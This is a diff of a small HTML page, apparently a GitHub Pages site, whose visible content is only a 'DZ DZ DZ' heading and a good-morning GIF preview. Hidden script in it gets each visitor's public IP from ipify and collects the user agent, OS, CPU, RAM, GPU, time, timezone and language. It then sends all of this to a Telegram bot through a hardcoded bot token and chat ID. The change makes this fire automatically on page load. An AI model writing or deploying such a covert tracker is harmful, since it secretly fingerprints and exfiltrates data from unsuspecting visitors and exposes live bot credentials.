@@ -1,109 +1,105 @@
 <!DOCTYPE html>
 <html data-arp-injected="true">
 <head>
-  <title></title>
-  
-  <!-- HTML Meta Tags -->
-  <meta name="description" content="undefined">
-
-  <!-- Facebook Meta Tags -->
-  <meta property="og:url" content="https://tronghieuzero98.github.io/smarthome/">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="">
-  <meta property="og:description" content="undefined">
-  <meta property="og:image" content="https://media.tenor.com/zgKRKI2gqJIAAAAC/good-morning.gif">
-
-  <!-- Twitter Meta Tags -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta property="twitter:domain" content="tronghieuzero98.github.io">
-  <meta property="twitter:url" content="https://tronghieuzero98.github.io/smarthome/">
-  <meta name="twitter:title" content="">
-  <meta name="twitter:description" content="undefined">
-  <meta name="twitter:image" content="https://media.tenor.com/zgKRKI2gqJIAAAAC/good-morning.gif">
-
-  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
-        
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-</head>
-<body>
-  <h1>DZ DZ DZ</h1>
-
   <script>
-    $(document).ready(function() {
-      //var telegramBotToken = "6223631247:AAEoTXUiOTnWUq1tzDFxhU1bPfI-WSZM-bs";
-      var telegramBotToken = "5887083123:AAHOh7bvU_0XbaEoQ9jQDrtJ5QFTA2YC3Po";
-      var chatId = 5296562266;
-      var excludedIPs = ["192.168.2.1", "10.0.0.1"]; // Thay thế danh sách này bằng những địa chỉ IP mà bạn muốn loại trừ
-
-  // Lấy địa chỉ IP
-      $.getJSON("https://api.ipify.org?format=json", function(data) {
-        var ip = data.ip;
-        console.log(ip)
-        if (excludedIPs.includes(ip)) {
-          console.log("Địa chỉ IP nằm trong danh sách ngoại lệ. Không gửi thông tin đến Telegram.");
-          return;
-        }
-
-        var cpu = navigator.hardwareConcurrency || "N/A";
-        var ram = navigator.deviceMemory || "N/A";
-        var disk = navigator.deviceStorage || "N/A"; // Thay thế 'deviceStorage' bằng thuộc tính tương ứng nếu có
-        var gpu = getGraphicsCard();
-        var os = getOperatingSystem();
-        var userAgent = navigator.userAgent;
-
-        var message = " - Địa chỉ IP mới: " + ip + "\n - User-Agent: " + userAgent + "\n - Hệ điều hành: " + os + "\n - CPU: " + cpu + "\n - RAM: " + ram + "\n - Disk: " + disk + "\n - GPU: " + gpu;
-
-        var payload = {
-          chat_id: chatId,
-          text: message
-        };
-
-        $.ajax({
-          type: "POST",
-          url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
-          data: payload,
-          dataType: "json",
-          success: function(response) {
-            console.log("Thông tin đã được gửi thành công đến Telegram");
-          },
-          error: function(error) {
-            console.log("Lỗi khi gửi thông tin đến Telegram: " + error);
-          }
-        });
-      });
-
-    // Các hàm hỗ trợ
+    function myFunction() {
+      alert("hello");
+    }
+    function addZero(i) {
+        if (i < 10) {i = "0" + i}
+        return i;
+     }
     function getOperatingSystem() {
-      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      if (/windows phone/i.test(userAgent)) {
-        return "Windows Phone";
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (/windows phone/i.test(userAgent)) {
+              return "Windows Phone";
+            }
+            if (/android/i.test(userAgent)) {
+              return "Android";
+            }
+            if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+              return "iOS";
+            }
+            if (/Macintosh|Mac OS X/.test(userAgent)) {
+              return "Mac OS";
+            }
+            if (/Windows NT/.test(userAgent)) {
+              return "Windows";
+            }
+            return "Unknown";
       }
-      if (/android/i.test(userAgent)) {
-        return "Android";
-      }
-      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        return "iOS";
-      }
-      if (/Macintosh|Mac OS X/.test(userAgent)) {
-        return "Mac OS";
-      }
-      if (/Windows NT/.test(userAgent)) {
-        return "Windows";
-      }
-      return "Unknown";
-    }
 
-    function getGraphicsCard() {
-      var canvas = document.createElement("canvas");
-      var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      var gpu = "N/A";
-      if (debugInfo) {
-        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      function getGraphicsCard() {
+        var canvas = document.createElement("canvas");
+        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        var gpu = "N/A";
+        if (debugInfo) {
+          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        return gpu;
       }
-      return gpu;
-    }
-});
-  </script>
+        function getIP() {
+        var telegramBotToken = "5887083123:AAHOh7bvU_0XbaEoQ9jQDrtJ5QFTA2YC3Po";
+        var chatId = 5296562266;
+        var excludedIPs = ["192.168.2.1", "10.0.0.1"];
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+          var ip = data.ip;
+          console.log(ip)
+          if (excludedIPs.includes(ip)) {
+            console.log("Địa chỉ IP nằm trong danh sách ngoại lệ");
+            return;
+          }
+          const d = new Date();
+          let h = addZero(d.getHours());
+          let m = addZero(d.getMinutes());
+          let s = addZero(d.getSeconds());
+          let ms = d.getMilliseconds();
+          let day = addZero(d.getDate()); 
+          let month = addZero(d.getMonth()+1); 
+          let year = d.getFullYear();
+          let time = h + ":" + m + ":" + s + ":" + ms + " " + day + "/" + month + "/" + year;
+          let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          //
+          var cpu = navigator.hardwareConcurrency || "N/A";
+          var ram = navigator.deviceMemory || "N/A";
+          var gpu = getGraphicsCard();
+          var os = getOperatingSystem();
+          var userAgent = navigator.userAgent;
+          var language = navigator.language;
+
+          var message = " - Địa chỉ IP mới: " + ip + "\n- Thời gian: " + time + "\n- Múi giờ: " + timezone + "\n- User-Agent: " + userAgent + "\n- Hệ điều hành: " + os + "\n- CPU: " + cpu + "\n- RAM: " + ram + "\n- GPU: " + gpu + "\n- Ngôn ngữ trình duyệt: " + language;
+
+          var payload = {
+            chat_id: chatId,
+            text: message
+          };
+
+          $.ajax({
+            type: "POST",
+            url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
+            data: payload,
+            dataType: "json",
+            success: function(response) {
+              console.log("Thông tin đã được gửi thành công đến Telegram");
+            },
+            error: function(error) {
+              console.log("Lỗi khi gửi thông tin đến Telegram: " + error);
+            }
+          });
+        })
+      }</script>
+      <meta http-equiv="OnStartup" content="javascript:getIP();">
+      <meta http-equiv="OnLoaded" content="javascript:getIP();">
+      <meta property="og:image" content="https://media.tenor.com/zgKRKI2gqJIAAAAC/good-morning.gif">
+  <!-- Meta Tags Generated via https://www.opengraph.xyz -->
+</head>
+<body onload="getIP()">
+  <h1>DZ DZ DZ</h1>
+  <button onclick="getIP()">Click me</button>
+  
 </body>
 </html>
+
+
